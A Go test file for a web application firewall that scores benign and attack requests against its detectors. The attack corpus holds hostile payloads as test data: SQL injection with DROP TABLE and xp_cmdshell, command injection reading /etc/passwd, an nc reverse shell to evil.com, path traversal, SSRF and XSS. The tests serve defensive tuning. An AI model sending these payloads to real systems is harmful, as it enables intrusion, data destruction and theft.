package detection

import (
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
	"github.com/guardianwaf/guardianwaf/internal/layers/detection/cmdi"
	"github.com/guardianwaf/guardianwaf/internal/layers/detection/lfi"
	"github.com/guardianwaf/guardianwaf/internal/layers/detection/nosqli"
	"github.com/guardianwaf/guardianwaf/internal/layers/detection/sqli"
	"github.com/guardianwaf/guardianwaf/internal/layers/detection/ssrf"
	"github.com/guardianwaf/guardianwaf/internal/layers/detection/ssti"
	"github.com/guardianwaf/guardianwaf/internal/layers/detection/xss"
	"github.com/guardianwaf/guardianwaf/internal/layers/sanitizer"
)

// These two corpora are the guard on detector tuning. A WAF that blocks real
// traffic is worse than no WAF, and a WAF that stops catching attacks is
// pointless, so every tuning change has to be checked against both directions
// at once.
//
// The benign corpus is not hypothetical: at one point all of the entries below
// scored at or above the default block_threshold of 50, so avatar uploads,
// issue comments, markdown tables, /~user/ paths and semver ranges were all
// answered with 403 by a default deployment.

const (
	blockThreshold = 50 // config default
	logThreshold   = 25 // config default
)

type scoringDetector interface {
	DetectorName() string
	Process(*engine.RequestContext) engine.LayerResult
}

func scoreRequest(t *testing.T, method, url, body string) (int, []string) {
	t.Helper()

	r := httptest.NewRequest(method, url, strings.NewReader(body))
	if body != "" {
		r.Header.Set("Content-Type", "application/json")
	}
	// Without a browser UA the bot detector skews manual probes; keep the
	// detector scores here isolated from that.
	r.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0")

	ctx := engine.AcquireContext(r, 1, 10<<20)
	defer engine.ReleaseContext(ctx)

	// Run the sanitizer first, exactly as the pipeline does at Order 300.
	// Detectors read ctx.Normalized*, which only the sanitizer populates, so
	// scoring them against a bare context would miss every decoding-dependent
	// case and overstate how much the raw-input paths catch.
	sanitizerCfg := sanitizer.Config{
		MaxURLLength:   8192,
		MaxHeaderSize:  8192,
		MaxHeaderCount: 100,
		MaxBodySize:    1 << 20,
		MaxCookieSize:  4096,
		AllowedMethods: []string{"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"},
	}
	sanitizer.NewLayer(&sanitizerCfg).Process(ctx)

	detectors := []scoringDetector{
		cmdi.NewDetector(true, 1.0),
		sqli.NewDetector(true, 1.0),
		lfi.NewDetector(true, 1.0),
		nosqli.NewDetector(true, 1.0),
		xss.NewDetector(true, 1.0),
		ssrf.NewDetector(true, 1.0),
		ssti.NewDetector(true, 1.0),
	}

	total := 0
	var fired []string
	for _, d := range detectors {
		res := d.Process(ctx)
		sub := 0
		for _, f := range res.Findings {
			sub += f.Score
		}
		if sub > 0 {
			total += sub
			fired = append(fired, d.DetectorName())
		}
	}
	return total, fired
}

// TestBenignTrafficIsNotBlocked pins the false positives that made blocking
// mode unusable on any public site.
func TestBenignTrafficIsNotBlocked(t *testing.T) {
	cases := []struct {
		name, method, url, body string
	}{
		{"avatar data URI", "POST", "http://x.com/api/profile",
			`{"avatar":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUg=="}`},
		{"issue comment with semicolon", "POST", "http://x.com/api/issues",
			`{"body":"Fixed the bug; update the docs when you get a chance."}`},
		{"tilde home directory", "GET", "http://x.com/~alice/photo.jpg", ""},
		{"semver caret range", "GET", "http://x.com/pkg?v=~1.2.3", ""},
		{"prose containing a newline", "POST", "http://x.com/api/comments",
			`{"text":"Please review.\nFind the button on the left."}`},
		{"markdown table", "POST", "http://x.com/api/comments",
			`{"text":"| id | name |\n|----|------|\n| 1  | bob  |"}`},
		{"the word mapreduce in prose", "POST", "http://x.com/api/comments",
			`{"text":"We discussed mapreduce at the meeting."}`},
		{"code review comment naming a DOM sink", "POST", "http://x.com/api/comments",
			`{"text":"Avoid innerHTML here; use textContent instead."}`},
		{"ordinary sentence", "POST", "http://x.com/api/comments",
			`{"text":"Thanks for the update, looks good to me."}`},
		{"profile with website and email", "POST", "http://x.com/api/profile",
			`{"website":"http://example.com","email":"alice@example.com"}`},
		{"form-encoded website and email", "POST", "http://x.com/api/profile",
			`website=http://example.com&email=alice@example.com`},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			total, fired := scoreRequest(t, c.method, c.url, c.body)
			if total >= blockThreshold {
				t.Fatalf("benign request blocked: score %d >= %d (detectors: %v)\n  %s %s %s",
					total, blockThreshold, fired, c.method, c.url, c.body)
			}
		})
	}
}

// TestAttackTrafficIsBlocked is the other half of the guard: it must fail if a
// false-positive fix is bought by letting real attacks through.
func TestAttackTrafficIsBlocked(t *testing.T) {
	cases := []struct {
		name, method, url, body string
	}{
		{"stacked DROP TABLE", "GET", "http://x.com/p?id=1;DROP+TABLE+users", ""},
		{"stacked UPDATE SET", "GET", "http://x.com/p?id=1;UPDATE+users+SET+admin=1", ""},
		{"stacked EXEC xp_cmdshell", "GET", "http://x.com/p?id=1;EXEC+xp_cmdshell+'dir'", ""},
		{"UNION SELECT", "GET", "http://x.com/p?id=1+UNION+SELECT+user,pass+FROM+users", ""},
		{"base64 decode piped to sh", "POST", "http://x.com/api/x",
			`{"c":"echo cGF5 | base64 -d | sh"}`},
		{"command separator with whoami", "GET", "http://x.com/p?host=127.0.0.1;whoami", ""},
		{"command separator with a path argument", "GET", "http://x.com/p?f=x;cat+/etc/passwd", ""},
		{"reverse shell via nc", "GET", "http://x.com/p?f=x;nc+evil.com+4444", ""},
		{"Windows 8.3 short name traversal", "GET", "http://x.com/f?p=c:\\progra~1\\windows\\system32", ""},
		{"Mongo mapReduce command", "POST", "http://x.com/api/q",
			`{"mapReduce":"users","map":"function(){emit(1,1)}"}`},
		{"Mongo $where", "POST", "http://x.com/api/q", `{"$where":"this.a==1"}`},
		{"path traversal to /etc/passwd", "GET", "http://x.com/f?p=../../../../etc/passwd", ""},
		{"SSRF to fully-qualified localhost", "GET", "http://x.com/f?url=http://127.0.0.1./admin", ""},
		{"SSRF with credentials in URL", "GET", "http://x.com/f?url=http://evil.com@127.0.0.1/admin", ""},
		{"entity-encoded percent XSS", "POST", "http://x.com/api/c",
			`{"t":"&#37;3Cscript&#37;3Ealert(1)&#37;3C/script&#37;3E"}`},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			total, fired := scoreRequest(t, c.method, c.url, c.body)
			if total < blockThreshold {
				t.Fatalf("attack not blocked: score %d < %d (detectors: %v)\n  %s %s %s",
					total, blockThreshold, fired, c.method, c.url, c.body)
			}
		})
	}
}

// TestAmbiguousInputIsLoggedNotBlocked covers the deliberate middle ground: a
// shell metacharacter followed by a bare everyday word is recorded so an
// operator can see it, but does not block on its own. See the M1 discussion in
// docs/history/AUDIT.md.
func TestAmbiguousInputIsLoggedNotBlocked(t *testing.T) {
	total, _ := scoreRequest(t, "GET", "http://x.com/p?f=x;id", "")
	if total >= blockThreshold {
		t.Fatalf("bare ambiguous command scored %d, want below %d", total, blockThreshold)
	}
	if total < logThreshold {
		t.Fatalf("bare ambiguous command scored %d, want at least %d so it is still logged", total, logThreshold)
	}
}
